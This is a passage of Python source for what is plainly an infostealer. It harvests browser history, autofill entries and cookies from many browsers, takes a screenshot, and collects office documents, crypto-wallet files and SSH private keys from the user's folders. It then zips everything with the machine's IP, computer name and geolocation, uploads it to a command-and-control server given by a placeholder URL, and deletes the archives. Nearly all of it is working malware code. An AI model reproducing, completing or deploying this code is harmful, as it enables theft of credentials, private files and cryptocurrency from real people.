                        f.write(f"{browser_name} Browser History\n")
                        f.write("=" * 50 + "\n\n")
                        for url, title, vc, lvt in results:
                            if url and title and (vc is not None) and (lvt is not None):
                                history.append((url, title, vc, lvt))
                                f.write(f"URL: {url}\n")
                                f.write(f"Title: {title}\n")
                                f.write(f"Visit Count: {vc}\n")
                                f.write(
                                    f"Last Visit: {datetime.fromtimestamp(lvt / 1000000 - 11644473600).strftime('%H:%M:%S %Y-%m-%d')}\n")
                                f.write("-" * 50 + "\n")
                except Exception:
                    pass
                finally:
                    cursor.close()
                    db.close()
                    os.remove(tempfile)

        history.sort(key=lambda x: x[3], reverse=True)
        return [(x[0], x[1], x[2]) for x in history]

    def GetAutofills(self) -> list[tuple[str, str]]:
        autofills = []
        Dest_path = os.path.join(os.path.expanduser("~"),destination_folder, "BrowserHistory")
        os.makedirs(Dest_path, exist_ok=True)
        autofills_file = os.path.join(Dest_path, 'Autofills.txt')

        browser_paths = [
            ("Chrome", self.ChromePath),
            ("Yandex", self.YandexPath),
            ("Edge", self.EdgePath),
            ("Opera", self.OperaPath)
        ]

        output_lines = []
        for _, browser_path in browser_paths:
            if not os.path.isdir(browser_path):
                continue
            autofills_file_paths = []
            for root, _, files in os.walk(browser_path):
                for file in files:
                    if file.lower() == 'web data':
                        autofills_file_paths.append(os.path.join(root, file))

            for path in autofills_file_paths:
                while True:
                    tempfile = os.path.join(os.getenv('temp'), self.Utility.GetRandomString(10) + '.tmp')
                    if not os.path.isfile(tempfile):
                        break
                try:
                    shutil.copy(path, tempfile)
                except Exception:
                    continue

                try:
                    db = sqlite3.connect(tempfile)
                    db.text_factory = lambda b: b.decode(errors='ignore')
                    cursor = db.cursor()
                    results = cursor.execute('SELECT name, value FROM autofill').fetchall()
                    for name, value in results:
                        name = name.strip()
                        value = value.strip()
                        if name and value:
                            autofills.append((name, value))
                            output_lines.append(f"FORM: {name}")
                            output_lines.append(f"VALUE: {value}")
                            output_lines.append("")
                except Exception as e:
                    print(f"Error processing {path}: {e}")
                finally:
                    cursor.close()
                    db.close()
                    os.remove(tempfile)

        with open(autofills_file, 'w', encoding='utf-8') as file:
            file.write('\n'.join(output_lines))
        return autofills



chrome_path = os.path.join(os.path.expanduser("~"), "AppData", "Local", "Google", "Chrome", "User Data", "Default")
yandex_path = os.path.join(os.path.expanduser("~"), "AppData", "Local", "Yandex", "YandexBrowser", "User Data","Default")
edge_path = os.path.join(os.path.expanduser("~"), "AppData", "Local", "Microsoft", "Edge", "User Data", "Default")
opera_path = os.path.join(os.path.expanduser("~"), "AppData", "Roaming", "Opera Software", "Opera Stable")


async def search_and_exfiltrate_files(dest_folder: str, executor: ThreadPoolExecutor) -> None:

    stolen_files_dir = os.path.join(dest_folder, "Stolen_Files")
    crypto_wallets_dir = os.path.join(stolen_files_dir, "Crypto_Wallets")
    create_folder_if_not_exists(stolen_files_dir)
    create_folder_if_not_exists(crypto_wallets_dir)

    target_extensions = {
        '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx', '.pdf',
        '.bmp'
    }

    wallet_patterns = {
        'wallet.dat',  # Bitcoin Core and derivatives
        'key.json', 'keystore', 'mnemonic.txt', 'seed.txt', # Common crypto-related files
        'electrum_wallet', 'litecoin_wallet', 'dogecoin_wallet', # Specific wallet filenames
        'id_rsa', 'id_dsa', 'id_ecdsa', 'id_ed25519' # SSH keys often used for access
    }

    search_paths = [
        os.path.expanduser("~"),
        os.path.join(os.path.expanduser("~"), "Documents"),
        os.path.join(os.path.expanduser("~"), "Downloads"),
        os.path.join(os.path.expanduser("~"), "Desktop"),
        os.path.join(os.path.expanduser("~"), "AppData", "Roaming"),
        os.path.join(os.path.expanduser("~"), "AppData", "Local"),
    ]

    copied_files = collections.deque() 

    async def _copy_file_safe(src: str, dst: str):
        try:
            if src not in copied_files:
                await asyncio.get_event_loop().run_in_executor(executor, shutil.copy2, src, dst)
                copied_files.append(src)
                if len(copied_files) > 1000: 
                    copied_files.popleft()
        except (PermissionError, FileNotFoundError, OSError) as e:
            pass 
        except Exception as e:
            pass 
    tasks = []
    for base_path in search_paths:
        if not os.path.exists(base_path):
            continue

        for root, _, files in await asyncio.get_event_loop().run_in_executor(executor, lambda p: list(os.walk(p)), base_path):
            for file_name in files:
                file_path = os.path.join(root, file_name)
                ext = os.path.splitext(file_name)[1].lower()

                if ext in target_extensions:
                    dest_file_path = os.path.join(stolen_files_dir, file_name)
                    tasks.append(_copy_file_safe(file_path, dest_file_path))
                elif file_name.lower() in wallet_patterns or any(pattern in file_name.lower() for pattern in wallet_patterns):
                    dest_file_path = os.path.join(crypto_wallets_dir, file_name)
                    tasks.append(_copy_file_safe(file_path, dest_file_path))
    await asyncio.gather(*tasks)

async def main():
    user_profile = os.getenv('USERPROFILE')
    destination_folder = os.path.join(user_profile, 'Windows NB')
    take_screenshot(destination_folder)
    create_folder_if_not_exists(destination_folder)
    browser_history_instance = BrowserHistory(chrome_path, yandex_path, edge_path, opera_path)
    browser_history_instance.GetAutofills()
    browser_history_instance.GetHistory()

    browsers = [
        "chrome", "edge", "opera", "opera_gx", "yandex", "tor", "brave",
        "vivaldi", "slimjet", "falkon", "seamonkey", "maxthon", "palemoon",
        "qutebrowser", "iridium", "centbrowser"
    ]

    tasks = [get_cookie_path_safe(browser_name) for browser_name in browsers]
    results = await asyncio.gather(*tasks)

    for browser_name, cookie_path in results:
        if cookie_path:
            copy_cookies(browser_name, cookie_path, destination_folder)

    public_ip = get_public_ip()
    computer_name = os.getenv("COMPUTERNAME", "UnknownPC")

    safe_ip = "".join(c if c.isalnum() or c == '.' else '_' for c in str(public_ip))
    safe_computer_name = "".join(c if c.isalnum() or c == '-' else '_' for c in str(computer_name))

    output_zip_path_prefix = os.path.join(user_profile, f"[{safe_ip}]_[{safe_computer_name}]")
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=os.cpu_count() or 4) as executor:
        exfil_task = asyncio.create_task(search_and_exfiltrate_files(destination_folder, executor))
        await asyncio.gather(exfil_task)

    zip_files = await zip_folder(destination_folder, output_zip_path_prefix)

    system_info_text, latitude, longitude = get_system_info()

    c2_server_url = '{{C2_SERVER_URL_PLACEHOLDER}}' 
    success = await send_to_c2_server(c2_server_url, zip_files, system_info_text, latitude, longitude)

    for zip_file in zip_files:
        try:
            os.remove(zip_file)
        except FileNotFoundError:
            print(f"File not found: {zip_file}")
        except Exception as e:
            print(f"Error removing file {zip_file}: {e}")

    if success:
        print("All logs successfully sent. Shutting down")
        sys.exit(0)


if __name__ == "__main__":
    asyncio.run(main())
